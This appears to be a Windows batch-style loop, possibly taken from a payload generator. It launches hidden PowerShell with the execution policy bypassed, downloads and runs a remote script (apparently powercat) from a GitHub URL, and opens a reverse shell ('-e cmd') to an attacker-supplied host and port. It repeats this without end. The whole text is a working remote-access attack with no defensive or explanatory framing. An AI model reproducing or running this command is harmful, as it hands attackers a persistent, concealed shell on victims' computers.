 :loop
 powershell -ep bypass -windowstyle hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Fidelinjector/FidelFiles/main/power.ps1');powercat -c '''+lhost+''' -p '''+lport+''' -e cmd"
 goto loop
